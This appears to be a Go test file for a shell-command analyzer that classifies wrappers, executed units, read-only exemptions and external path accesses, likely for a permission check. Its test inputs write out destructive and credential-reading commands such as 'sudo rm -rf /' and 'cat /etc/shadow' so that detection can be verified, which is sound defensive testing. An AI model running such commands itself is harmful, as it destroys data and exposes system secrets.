		eqCommands(t, cmds(t, `AWS_PROFILE=prod bash -c "rm -rf /"`),
			BashCommand{Text: `bash -c "rm -rf /"`, WrapperKind: opaque, ExecutedUnit: "rm -rf /"})
	})
	each(t, "does not flag %s as opaque", func(t *testing.T) {
		for _, command := range []string{"bash script.sh", "bash", "ls -la", "grep -c foo file"} {
			eqCommands(t, cmds(t, command), unit(command))
		}
	})

	// indirection wrappers
	each(t, "flags %s as an indirection wrapper", func(t *testing.T) {
		for _, row := range [][2]string{
			{"sudo aws s3 ls", "aws s3 ls"}, {"env FOO=bar aws s3 ls", "aws s3 ls"}, {"xargs rm -rf", "rm -rf"},
			{"time aws s3 ls", "aws s3 ls"}, {"nohup aws s3 ls", "aws s3 ls"}, {"timeout 10 aws s3 ls", "aws s3 ls"},
			{"nice -n 10 aws s3 ls", "aws s3 ls"}, {"/usr/bin/sudo aws s3 ls", "aws s3 ls"},
			// Exec-capable rewrites and prefix wrappers (#575).
			{"parallel rm ::: x", "rm ::: x"}, {"doas aws s3 ls", "aws s3 ls"}, {"setsid aws s3 ls", "aws s3 ls"},
			{"stdbuf -oL aws s3 ls", "aws s3 ls"}, {"flock /tmp/lock aws s3 ls", "aws s3 ls"},
			// find/fd with a per-result exec flag
			{"find . -exec rm {} \\;", "rm {}"}, {"find . -execdir rm {} \\;", "rm {}"},
			{"find . -ok rm {} \\;", "rm {}"}, {"find . -okdir rm {} \\;", "rm {}"},
			{"fd -x rm", "rm"}, {"fd --exec rm", "rm"}, {"fd -X rm", "rm"}, {"fd --exec-batch rm", "rm"},
		} {
			eqCommands(t, cmds(t, row[0]), BashCommand{Text: row[0], WrapperKind: indirect, ExecutedUnit: row[1]})
		}
	})
	each(t, "flags %s as an indirection wrapper running a pure reader", func(t *testing.T) {
		for _, row := range [][2]string{{"rust-parallel echo", "echo"}, {"rush echo", "echo"}, {"watch ls", "ls"}} {
			eqCommands(t, cmds(t, row[0]),
				BashCommand{Text: row[0], WrapperKind: indirect, ExecutedUnit: row[1], FloorExemption: coreRead})
		}
	})
	tw(t, bpFile, "flags an env-prefixed indirection wrapper after stripping the prefix", func(t *testing.T) {
		eqCommands(t, cmds(t, "AWS_PROFILE=prod sudo aws s3 ls"),
			BashCommand{Text: "sudo aws s3 ls", WrapperKind: indirect, ExecutedUnit: "aws s3 ls"})
	})
	each(t, "does not flag %s as an indirection wrapper", func(t *testing.T) {
		for _, command := range []string{"aws s3 ls", "ls -la", "grep -n foo file", "find . -name foo", "fd pattern", "fd -H -t f pattern"} {
			eqCommands(t, cmds(t, command), unit(command))
		}
	})

	// executed unit
	each(t, "names what %s actually runs", func(t *testing.T) {
		for _, row := range [][2]string{
			{`bash -c "rm -rf /"`, "rm -rf /"}, {"sudo aws s3 rm", "aws s3 rm"}, {"sudo -u root aws s3 rm", "aws s3 rm"},
			{"timeout 10 grep foo", "grep foo"}, {"find . -name x -exec grep foo {} \\;", "grep foo {}"},
			{"sudo timeout 5 xargs grep foo", "grep foo"},
		} {
			eqv(t, cmds(t, row[0]).Commands()[0].ExecutedUnit, row[1])
		}
	})
	tw(t, bpFile, "is absent for an ordinary command", func(t *testing.T) {
		eqCommands(t, cmds(t, "grep foo"), unit("grep foo"))
	})
	tw(t, bpFile, "is absent when the wrapper names no inner command", func(t *testing.T) {
		eqCommands(t, cmds(t, "xargs"), BashCommand{Text: "xargs", WrapperKind: indirect})
	})

	// floor exemption
	exemptions := func(t *testing.T, command string) []bashanalysis.FloorExemption {
		out := []bashanalysis.FloorExemption{}
		for _, c := range cmds(t, command).Commands() {
			out = append(out, c.FloorExemption)
		}
		return out
	}
	eqEx := func(t *testing.T, command string, want ...bashanalysis.FloorExemption) {
		t.Helper()
		got := exemptions(t, command)
		if len(got) != len(want) {
			t.Errorf("%q: got %q, want %q", command, got, want)
			return
		}
		for i := range got {
			if got[i] != want[i] {
				t.Errorf("%q: got %q, want %q", command, got, want)
				return
			}
		}
	}
	each(t, "exempts %s", func(t *testing.T) {
		for _, command := range []string{
			"xargs grep foo", "xargs -0 rg pattern", "find . -name '*.ts' -exec wc -l {} +", "sudo timeout 5 xargs grep foo",
			"xargs sed -n p", "find . -name '*.md' -exec sed -n 1p {} +", "xargs awk '{print}'",
		} {
			eqEx(t, command, coreRead)
		}
	})
	each(t, "does not exempt %s (%s)", func(t *testing.T) {
		for _, row := range [][2]string{
			{"xargs pnpm test", "the inner command is not in the core"},
			{"xargs -I{} sh -c 'grep -l x {}'", "the payload is not re-parsed"},
			{"find . -exec sh -c 'grep x' \\;", "the payload is not re-parsed"},
			{"xargs sort -o /tmp/x", "`-o` withdraws sort's read claim"},
			{"xargs sed -i s/a/b/", "`-i` withdraws sed's read claim"},
			{"xargs sed 'w out'", "a `w` command withdraws sed's read claim"},
			{"xargs awk -f p.awk", "`-f` withdraws awk's read claim"},
		} {
			eqEx(t, row[0], "")
		}
	})
	// a withdrawing option spelled with quotes
	each(t, "does not exempt %s", func(t *testing.T) {
		for _, command := range []string{
			"xargs find . '-delete'", `xargs find . "-delete"`, "xargs sort '-o' /tmp/x", "xargs fd foo '--exec' rm",
		} {
			eqEx(t, command, "")
		}
	})
	tw(t, bpFile, "does not exempt a computed word that may spell a withdrawing option", func(t *testing.T) {
		eqEx(t, "xargs find . $A", "")
	})
	tw(t, bpFile, "still exempts a computed word behind a literal", func(t *testing.T) {
		eqEx(t, "xargs find packages/*/docs", coreRead)
	})
	tw(t, bpFile, "still exempts a quoted argument that withdraws nothing", func(t *testing.T) {
		eqEx(t, "xargs grep 'foo'", coreRead)
	})
	tw(t, bpFile, "is absent for a command that is not a wrapper", func(t *testing.T) {
		eqEx(t, "grep foo", "")
	})
	// a statement that writes through a redirect
	tw(t, bpFile, "withholds the exemption from the redirected wrapper", func(t *testing.T) {
		eqEx(t, "xargs grep foo > out.txt", "")
	})
	each(t, "withholds it for a %s redirect too", func(t *testing.T) {
		for _, operator := range []string{">>", ">|", "&>"} {
			eqEx(t, "xargs grep foo "+operator+" out.txt", "")
		}
	})
	tw(t, bpFile, "withholds it from every unit of a redirected pipeline", func(t *testing.T) {
		// The redirect applies to the last element, but it hangs off the whole pipeline in the parse tree. Over-attributing is
		// the fail-closed direction: the flag can only ever withhold an exemption.
		eqEx(t, "cat a | xargs grep b > out", "", "")
	})
	tw(t, bpFile, "withholds it from a redirected subshell's commands", func(t *testing.T) {
		eqEx(t, "( xargs grep foo ) > out", "", "")
	})
	tw(t, bpFile, "withholds it from a redirected compound statement's commands", func(t *testing.T) {
		eqEx(t, "if true; then xargs grep -l x; fi > out.txt", "", "", "")
	})
	each(t, "withholds it for a destination named by %s (%s)", func(t *testing.T) {
		for _, command := range []string{"xargs grep foo > $OUT", "xargs grep foo >${OUT}", "xargs grep foo > ${DIR}/log"} {
			eqEx(t, command, "")
		}
	})
	tw(t, bpFile, "withholds it for a command-substitution destination", func(t *testing.T) {
		// Two units: the wrapper, and the `mktemp` hosted in the destination.
		eqEx(t, "xargs grep foo > $(mktemp)", "", "")
	})
	// a redirect hosted inside the command
	tw(t, bpFile, "withholds the exemption when it writes", func(t *testing.T) {
		eqEx(t, ">/tmp/o xargs grep foo", "")
	})
	tw(t, bpFile, "keeps the exemption for a descriptor duplication", func(t *testing.T) {
		eqEx(t, "2>&1 xargs grep foo", coreRead)
	})
	tw(t, bpFile, "keeps it when a word follows a descriptor duplication", func(t *testing.T) {
		// `~/x` is `ls`'s operand, not a file `2>&1` writes.
		eqEx(t, "rg -l x | xargs ls -1t 2>&1 ~/x", "", coreRead)
	})
	// a redirect that writes no file
	tw(t, bpFile, "keeps the exemption for a descriptor duplication", func(t *testing.T) {
		eqEx(t, "xargs grep foo 2>&1", coreRead)
	})
	tw(t, bpFile, "keeps the exemption for an input redirect", func(t *testing.T) {
		eqEx(t, "xargs grep foo < in.txt", coreRead)
	})
	tw(t, bpFile, "gives a nested execution its own scope", func(t *testing.T) {
		// The redirect belongs to the enclosing statement, not to the command substitution hosted in its destination.
		eqEx(t, "echo hi > $(xargs grep foo)", "", coreRead)
	})

	// units from a parse tree-sitter could not resolve (#840)
	tw(t, bpFile, "marks a command the failure reaches only through its statement", func(t *testing.T) {
		eqCommands(t, cmds(t, "git add -A . && git commit -F - <<'MSG' 2>&1 | rm -rf /tmp/x\nmsg\nMSG"),
			BashCommand{Text: "git add -A .", ParseUnresolved: true},
			BashCommand{Text: "git commit -F", ParseUnresolved: true},
			BashCommand{Text: "rm -rf /tmp/x", ParseUnresolved: true, Salvaged: true},
			BashCommand{Text: "git add -A .", ParseUnresolved: true, Salvaged: true},
			BashCommand{Text: "git commit -F", ParseUnresolved: true, Salvaged: true},
			BashCommand{Text: "rm -rf /tmp/x", ParseUnresolved: true, Salvaged: true})
	})
	tw(t, bpFile, "leaves a statement beside the failed one unmarked", func(t *testing.T) {
		// `rm -rf /tmp/y` is a sibling of the failed `redirected_statement`, not beneath it, so its own rule still decides it.
		eqCommands(t, cmds(t, "echo hi > out.txt <> rw.txt; rm -rf /tmp/y"),
			BashCommand{Text: "echo hi", ParseUnresolved: true}, unit("rm -rf /tmp/y"))
	})
	each(t, "marks nothing in %s that parses cleanly", func(t *testing.T) {
		for _, command := range []string{"cd /repo && git push", "echo hi | tail -2", "cat a > out.txt", "for f in a b; do rm $f; done"} {
			for _, c := range cmds(t, command).Commands() {
				if c.ParseUnresolved {
					t.Errorf("%q: unit %#v is marked", command, c)
				}
			}
		}
	})

	// a command the parse dropped entirely (#875)
	tw(t, bpFile, "enumerates the piped command the recovery left in no unit", func(t *testing.T) {
		program := cmds(t, "git add -A . && git commit -F - <<'MSG' 2>&1 | rm -rf /tmp/x\nmsg\nMSG")
		if !hasCommand(program.Commands(), BashCommand{Text: "rm -rf /tmp/x", ParseUnresolved: true, Salvaged: true}) {
			t.Errorf("not enumerated: %#v", program.Commands())
		}
	})
	tw(t, bpFile, "appends the salvaged unit after the units the primary parse produced", func(t *testing.T) {
		eqCommands(t, cmds(t, "cat <<'MSG' 2>&1 | tail -4\nmsg\nMSG"),
			BashCommand{Text: "cat", ParseUnresolved: true},
			BashCommand{Text: "tail -4", ParseUnresolved: true, Salvaged: true},
			BashCommand{Text: "cat", ParseUnresolved: true, Salvaged: true},
			BashCommand{Text: "tail -4", ParseUnresolved: true, Salvaged: true})
	})
	tw(t, bpFile, "flags a salvaged indirection wrapper like any other", func(t *testing.T) {
		// The salvaged root goes through the ordinary enumeration, so the wrapper floor reaches it without a second vocabulary.
		wrapper := BashCommand{Text: "sudo rm -rf /", WrapperKind: indirect, ExecutedUnit: "rm -rf /", ParseUnresolved: true, Salvaged: true}
		eqCommands(t, cmds(t, "cat <<'MSG' 2>&1 | sudo rm -rf /\nmsg\nMSG"),
			BashCommand{Text: "cat", ParseUnresolved: true}, wrapper,
			BashCommand{Text: "cat", ParseUnresolved: true, Salvaged: true}, wrapper)
	})
	tw(t, bpFile, "salvages nothing from a region whose own re-parse fails", func(t *testing.T) {
		// The `<>` shapes (#814): recovery's invented structure does not re-parse, so no fragment is admitted as a command.
		eqCommands(t, cmds(t, "cat <> rw.txt"), BashCommand{Text: "cat", ParseUnresolved: true})
	})

	// a heredoc tail the grammar cannot parse
	each(t, "enumerates the command after %s", func(t *testing.T) {
		for _, line := range []string{"cat <<EOF ; rm -rf x", "cat <<EOF & rm -rf x", "cat 2<<EOF ; rm -rf x"} {
			eqCommands(t, cmds(t, line+"\nb\nEOF"),
				BashCommand{Text: "cat", ParseUnresolved: true},
				BashCommand{Text: "cat", ParseUnresolved: true, Salvaged: true},
				BashCommand{Text: "rm -rf x", ParseUnresolved: true, Salvaged: true})
		}
	})
	tw(t, bpFile, "enumerates the command after a descriptor the grammar lexed into the delimiter", func(t *testing.T) {
		eqCommands(t, cmds(t, "cat 0<<EOF | rm -rf x\nb\nEOF"),
			unit("cat"),
			BashCommand{Text: "0<<EOF | rm -rf x\nb\nEOF", ParseUnresolved: true},
			BashCommand{Text: "cat", ParseUnresolved: true, Salvaged: true},
			BashCommand{Text: "rm -rf x", ParseUnresolved: true, Salvaged: true})
	})
	tw(t, bpFile, "gives the words after the heredoc to its command", func(t *testing.T) {
		eqCommands(t, cmds(t, "cat <<EOF arg > /tmp/o\nb\nEOF"),
			BashCommand{Text: "cat", ParseUnresolved: true},
			BashCommand{Text: "cat arg", ParseUnresolved: true, Salvaged: true})
	})
	tw(t, bpFile, "enumerates the command after a heredoc inside a compound statement", func(t *testing.T) {
		program := cmds(t, "if true; then cat <<EOF ; rm x\nb\nEOF\nfi")
		if !hasCommand(program.Commands(), BashCommand{Text: "rm x", ParseUnresolved: true, Salvaged: true}) {
			t.Errorf("not enumerated: %#v", program.Commands())
		}
	})
}

func TestBashProgramSlices(t *testing.T) {
	tw(t, bpFile, "derives both slices from a single parse", func(t *testing.T) {
		program := bpParse(t, "cat .env /etc/hosts", bpNormalizer(t, bpCwd))
		eqStrings(t, ruleTokens(program), ".env", "/etc/hosts")
		external := externalValues(program)
		if !contains(external, "/etc/hosts") || contains(external, ".env") {
			t.Errorf("external %q", external)
		}
	})
}

func TestBashProgramWorkdirSeed(t *testing.T) {
	n := func(t *testing.T) *PathNormalizer { return bpNormalizer(t, bpCwd) }

	tw(t, bpFile, "flags an absolute workdir outside cwd as an external path", func(t *testing.T) {
		if !contains(externalValues(bpParse(t, "echo hi", n(t), "/etc")), "/etc") {
			t.Error("/etc is not external")
		}
	})
	tw(t, bpFile, "resolves a relative token against the workdir base", func(t *testing.T) {
		external := externalValues(bpParse(t, "cat ../secret.txt", n(t), "/etc"))
		// ../secret.txt resolves against /etc, not cwd.
		if !contains(external, "/secret.txt") || !contains(external, "/etc") {
			t.Errorf("external %q", external)
		}
	})
	tw(t, bpFile, "keeps an absolute token base-independent under a workdir", func(t *testing.T) {
		external := externalValues(bpParse(t, "cat /var/log/syslog", n(t), "/etc"))
		if !contains(external, "/var/log/syslog") || contains(external, "/etc/var/log/syslog") {
			t.Errorf("external %q", external)
		}
	})
	tw(t, bpFile, "does not flag a workdir inside cwd, and resolves relative tokens under it", func(t *testing.T) {
		// ../secret.txt from cwd/sub resolves back to cwd/secret.txt (internal), and the workdir sub is inside cwd.
		if got := bpParse(t, "cat ../secret.txt", n(t), "sub").ExternalAccesses(); len(got) != 0 {
			t.Errorf("got %#v", got)
		}
	})
	tw(t, bpFile, "resolves a relative path-rule candidate against the workdir base", func(t *testing.T) {
		program := bpParse(t, "cat sub/file.txt", n(t), "/work")
		c := mustRuleCandidate(t, program, "sub/file.txt")
		if !contains(c.Path.MatchValues(), "/work/sub/file.txt") {
			t.Errorf("match values %q", c.Path.MatchValues())
		}
	})
	tw(t, bpFile, "reproduces cwd-based resolution when no workdir is given", func(t *testing.T) {
		// ../secret.txt from cwd resolves against the parent of cwd.
		if !contains(externalValues(bpParse(t, "cat ../secret.txt", n(t))), "/projects/secret.txt") {
			t.Error("/projects/secret.txt is not external")
		}
	})
	tw(t, bpFile, "applies Git Bash drive-mount semantics to a win32 workdir", func(t *testing.T) {
		mockRealpath(t, identityRealpath)
		win := NewPathNormalizer(Win32PathFlavor, `C:\projects\app`)
		program := bpParse(t, "echo hi", win, "/c/work")
		// /c/work is the MSYS mount for C:\work: outside the cwd, so flagged.
		found := false
		for _, v := range externalValues(program) {
			if strings.Contains(strings.ToLower(v), "work") {
				found = true
			}
		}
		if !found {
			t.Errorf("external %q", externalValues(program))
		}
	})
	tw(t, bpFile, "attributes nothing to the seeded workdir itself", func(t *testing.T) {
		program := bpParse(t, "echo hi", n(t), "/etc")
		for _, e := range program.ExternalAccesses() {
			if e.Path.Value() == "/etc" {
				if e.Effect != UnprovenEffect {
					t.Errorf("effect %#v", e.Effect)
				}
				return
			}
		}
		t.Error("no /etc entry")
	})
}

func TestBashProgramEffectAttribution(t *testing.T) {
	n := func(t *testing.T) *PathNormalizer { return bpNormalizer(t, bpCwd) }
	type pe struct {
		Path   string
		Effect TokenEffect
	}
	externalsWithEffect := func(program *BashProgram) []pe {
		out := []pe{}
		for _, e := range program.ExternalAccesses() {
			out = append(out, pe{e.Path.Value(), e.Effect})
		}
		return out
	}
	type te struct {
		Token  string
		Effect TokenEffect
	}
	candidatesWithEffect := func(program *BashProgram) []te {
		out := []te{}
		for _, c := range program.PathRuleCandidates() {
			out = append(out, te{c.Token, c.Effect})
		}
		return out
	}
	eqJSON := func(t *testing.T, got, want any) {
		t.Helper()
		if !reflect.DeepEqual(got, want) {
			t.Errorf("got %#v, want %#v", got, want)
		}
	}
	readCore := TokenEffect{Effect: EffectRead, Source: SourceCore}
	writeSyntax := TokenEffect{Effect: EffectWrite, Source: SourceSyntax}

	tw(t, bpFile, "carries a core word's read onto its external access", func(t *testing.T) {
		eqJSON(t, externalsWithEffect(bpParse(t, "cat /etc/hosts", n(t))), []pe{{"/etc/hosts", readCore}})
	})
	tw(t, bpFile, "carries a core word's read onto its rule candidate", func(t *testing.T) {
		eqJSON(t, candidatesWithEffect(bpParse(t, "cat /etc/hosts", n(t))), []te{{"/etc/hosts", readCore}})
	})
	tw(t, bpFile, "carries a redirect's write onto its destination", func(t *testing.T) {
		eqJSON(t, candidatesWithEffect(bpParse(t, "cat /etc/hosts > /tmp/out.txt", n(t))),
			[]te{{"/etc/hosts", readCore}, {"/tmp/out.txt", writeSyntax}})
	})
	// a word after a redirect's target
	tw(t, bpFile, "carries the command's read, not the operator's write", func(t *testing.T) {
		eqJSON(t, candidatesWithEffect(bpParse(t, "grep pat 2>/dev/null /etc/hosts", n(t))),
			[]te{{"/dev/null", writeSyntax}, {"/etc/hosts", readCore}})
	})
	tw(t, bpFile, "carries the command's read after a close operator", func(t *testing.T) {
		eqJSON(t, candidatesWithEffect(bpParse(t, "cat >&- /etc/hosts", n(t))), []te{{"/etc/hosts", readCore}})
	})
	tw(t, bpFile, "reaches the command's retraction guards", func(t *testing.T) {
		eqJSON(t, externalsWithEffect(bpParse(t, "find /tmp/x 2>/dev/null -delete", n(t))),
			[]pe{{"/tmp/x", TokenEffect{Effect: EffectUnproven, Source: SourceRetracted}}})
	})
	tw(t, bpFile, "proves nothing for a token a non-core command owns", func(t *testing.T) {
		c := mustRuleCandidate(t, bpParse(t, "rm -rf /tmp/gone", n(t)), "/tmp/gone")
		eqEffect(t, c.Effect, EffectUnproven, SourceUnproven)
	})
	// two attributions of one resolved path
	tw(t, bpFile, "folds to a single external access", func(t *testing.T) {
		if got := bpParse(t, "cat /etc/hosts > /etc/hosts", n(t)).ExternalAccesses(); len(got) != 1 {
			t.Errorf("got %d", len(got))
		}
	})
	tw(t, bpFile, "falls to unproven when the two proofs disagree", func(t *testing.T) {
		program := bpParse(t, "cat /etc/hosts > /etc/hosts", n(t))
		if len(program.ExternalAccesses()) < 1 || program.ExternalAccesses()[0].Effect != UnprovenEffect {
			t.Errorf("externals %#v", program.ExternalAccesses())
		}
		cands := program.PathRuleCandidates()
		if len(cands) != 1 || cands[0].Effect != UnprovenEffect {
			t.Errorf("candidates %#v", cands)
		}
	})
	tw(t, bpFile, "keeps the effect when the two proofs agree", func(t *testing.T) {
		program := bpParse(t, "cat /etc/hosts && head /etc/hosts", n(t))
		got := program.ExternalAccesses()
		if len(got) != 1 {
			t.Fatalf("got %d", len(got))
		}
		eqEffect(t, got[0].Effect, EffectRead, SourceCore)
	})
}

func TestBashProgramDroppedCommandPaths(t *testing.T) {
	n := func(t *testing.T) *PathNormalizer { return bpNormalizer(t, bpCwd) }
	const dropped = "cat <<'MSG' 2>&1 | cat /etc/shadow\nmsg\nMSG"

	tw(t, bpFile, "projects the dropped command's operand as a rule candidate", func(t *testing.T) {
		eqStrings(t, ruleTokens(bpParse(t, dropped, n(t))), "/etc/shadow")
	})
	tw(t, bpFile, "flags the dropped command's operand as an external access", func(t *testing.T) {
		eqStrings(t, externalValues(bpParse(t, dropped, n(t))), "/etc/shadow")
	})
	tw(t, bpFile, "carries the effect the dropped command's own word proves", func(t *testing.T) {
		eqEffect(t, bpParse(t, dropped, n(t)).PathRuleCandidates()[0].Effect, EffectRead, SourceCore)
	})
	tw(t, bpFile, "folds a path the primary parse already named", func(t *testing.T) {
		program := bpParse(t, "cat /etc/hosts <<'MSG' 2>&1 | cat /etc/hosts\nmsg\nMSG", n(t))
		if len(program.ExternalAccesses()) != 1 || len(program.PathRuleCandidates()) != 1 {
			t.Errorf("externals %d, candidates %d", len(program.ExternalAccesses()), len(program.PathRuleCandidates()))
		}
	})
	tw(t, bpFile, "keeps a relative operand literal rather than resolving it against the cwd", func(t *testing.T) {
		// The salvaged fragment carries no record of the `cd` in force where it sat, so resolving `../secret` against the session
		// cwd would name a different file than the one that runs. #393's unknown base declines the claim instead.
		program := bpParse(t, "cd /outside && cat <<'MSG' 2>&1 | cat ../secret\nmsg\nMSG", n(t))
		eqStrings(t, mustRuleCandidate(t, program, "../secret").Path.MatchValues(), "../secret")
	})
	tw(t, bpFile, "projects a redirect written after a heredoc the grammar cannot parse as a write", func(t *testing.T) {
		program := bpParse(t, "cat <<EOF arg > /tmp/o\nb\nEOF", n(t))
		got := program.ExternalAccesses()
		if len(got) != 1 || got[0].Path.Value() != "/tmp/o" {
			t.Fatalf("got %#v", got)
		}
		eqEffect(t, got[0].Effect, EffectWrite, SourceSyntax)
	})
	tw(t, bpFile, "leaves a cleanly-parsed command's slices untouched", func(t *testing.T) {
		eqStrings(t, ruleTokens(bpParse(t, "cat .env /etc/hosts", n(t))), ".env", "/etc/hosts")
	})
}

func TestBashProgramInlineScript(t *testing.T) {
	n := func(t *testing.T) *PathNormalizer { return bpNormalizer(t, bpCwd) }
	// The issue's reported command, abbreviated but structurally intact.
	reported := "node -e \"\n" +
		"// check which packages are installed\n" +
		"const fs = require('fs');\n" +
		"for (const pkg of ['pkg-a','pkg-b']) {\n" +
		"  try { console.log(pkg, require.resolve(pkg + '/package.json')); } catch { console.log(pkg, '(not installed)'); }\n" +
		"}\n" +
		"\""

	tw(t, bpFile, "raises no external access for the reported command", func(t *testing.T) {
		if got := bpParse(t, reported, n(t)).ExternalAccesses(); len(got) != 0 {
			t.Errorf("got %#v", got)
		}
	})
	tw(t, bpFile, "offers no rule candidate for the reported command", func(t *testing.T) {
		if got := bpParse(t, reported, n(t)).PathRuleCandidates(); len(got) != 0 {
			t.Errorf("got %#v", got)
		}
	})
	tw(t, bpFile, "still enumerates the invocation for the bash surface", func(t *testing.T) {
		eqCommands(t, bpParse(t, `node -e "// x"`, n(t)), unit(`node -e "// x"`))
	})
	tw(t, bpFile, "still projects a script-hosted command's operand", func(t *testing.T) {
		eqStrings(t, externalValues(bpParse(t, `node -e "$(cat /etc/shadow)"`, n(t))), "/etc/shadow")
	})
	tw(t, bpFile, "still flags a script file's operand outside the tree", func(t *testing.T) {
		eqStrings(t, externalValues(bpParse(t, "node build.js /etc/passwd", n(t))), "/etc/passwd")
	})
}
